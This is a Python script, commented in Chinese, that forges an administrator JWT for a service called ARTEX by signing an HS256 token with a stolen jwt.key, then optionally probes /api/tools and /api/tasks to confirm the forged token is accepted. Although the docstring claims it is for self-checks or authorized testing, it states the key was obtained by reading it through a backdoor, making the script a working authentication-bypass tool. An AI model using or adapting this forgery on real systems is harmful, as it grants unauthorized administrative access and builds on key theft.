#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""用 ARTEX 的 jwt.key 自签一个管理员 token（仅用于自查/授权测试）。

前提：你已经拿到目标的 jwt.key（例如通过本次后门读取）。本脚本不联网、不猜密钥，
只做一件事：按服务端同样的规则签一个 HS256 token。

用法：
    python forge_jwt.py jwt.key                  # 只打印 token
    python forge_jwt.py jwt.key --days 7         # 指定有效期
    python forge_jwt.py jwt.key --url http://127.0.0.1:8787
                                                 # 签完顺便调 /api/tools 验证是否被接受
    python forge_jwt.py /app/jwt.key --save token.txt

密钥可以给文件路径，也可以直接把内容当参数（不推荐，会留在 shell 历史里）。

规则（与服务端一致）：
    alg  = HS256
    key  = 文件内容的 TrimSpace 结果（服务端就是这么读的）
    sub  = "ARTEX"，payload 带 iat / exp
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import os
import sys
import time
import uuid

DEFAULT_DAYS = 7


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def load_key(path: str) -> bytes:
    with open(path, "rb") as fh:
        raw = fh.read()
    key = raw.strip()  # 服务端用的是 strings.TrimSpace(文件内容)
    if len(key) < 32:
        sys.exit(f"密钥太短（{len(key)} 字节，至少 32）：{path}")
    return key


def forge(key: bytes, days: float) -> str:
    now = int(time.time())
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub": "ARTEX",
        "iat": now,
        "exp": now + int(days * 86400),
        "jti": uuid.uuid4().hex[:16],
    }
    signing_input = f"{b64url(json.dumps(header, separators=(',', ':')).encode())}." \
                    f"{b64url(json.dumps(payload, separators=(',', ':')).encode())}"
    sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64url(sig)


def verify(url: str, token: str) -> int:
    import urllib.error
    import urllib.request

    base = url.rstrip("/")
    for path in ("/api/tools", "/api/tasks"):
        req = urllib.request.Request(base + path, headers={"Authorization": "Bearer " + token})
        try:
            with urllib.request.urlopen(req, timeout=8) as resp:
                print(f"  GET {path} -> HTTP {resp.status}（token 被接受）", file=sys.stderr)
                return 0
        except urllib.error.HTTPError as e:
            print(f"  GET {path} -> HTTP {e.code}（{'被拒绝' if e.code in (401, 403) else '其他错误'}）", file=sys.stderr)
        except Exception as e:
            print(f"  GET {path} -> 连接失败：{e}", file=sys.stderr)
            return 1
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(add_help=True, description="用 jwt.key 自签 ARTEX 管理员 token")
    ap.add_argument("keyfile", help="jwt.key 文件路径；也可以直接传 32 位以上的密钥字符串")
    ap.add_argument("--days", type=float, default=DEFAULT_DAYS, help=f"有效期天数，默认 {DEFAULT_DAYS}")
    ap.add_argument("--url", help="签完用这个 token 调一次接口验证，例如 http://127.0.0.1:8787")
    ap.add_argument("--save", help="把 token 写入文件（默认只打印到屏幕）")
    args = ap.parse_args()

    if os.path.isfile(args.keyfile):
        key = load_key(args.keyfile)
    else:
        raw = args.keyfile.strip()
        # 也接受直接把密钥当参数传（32 位以上、不像路径）
        if len(raw) >= 32 and not any(c in raw for c in ("/", "\\", ":")):
            key = raw.encode()
            print("提示：按命令行字符串当密钥处理；密钥会留在 shell 历史里，建议改用文件。", file=sys.stderr)
        else:
            sys.exit(
                f"找不到密钥文件：{args.keyfile}（也可以直接把 jwt.key 的内容当参数传，长度需 >= 32）"
            )
    token = forge(key, args.days)

    print(token)
    if args.save:
        with open(args.save, "w", encoding="utf-8") as fh:
            fh.write(token + "\n")
        print(f"\n已写入：{args.save}", file=sys.stderr)
    if args.url:
        print("\n验证：", file=sys.stderr)
        return verify(args.url, token)
    print("\n用法示例：curl -H \"Authorization: Bearer $TOKEN\" http://127.0.0.1:8787/api/tools", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
